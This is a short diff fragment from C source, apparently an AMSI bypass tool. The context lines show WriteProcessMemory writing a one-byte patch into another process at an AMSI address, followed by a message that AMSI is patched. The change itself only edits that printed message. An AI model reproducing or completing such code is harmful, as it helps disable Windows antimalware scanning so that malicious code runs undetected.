@@ -110,7 +110,7 @@ wmain() {
 	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0))
 		return (-1);
 
-	printf("\nAMSI patched\n");
+	printf("AMSI patched\n");
 
 	system("pause");
 
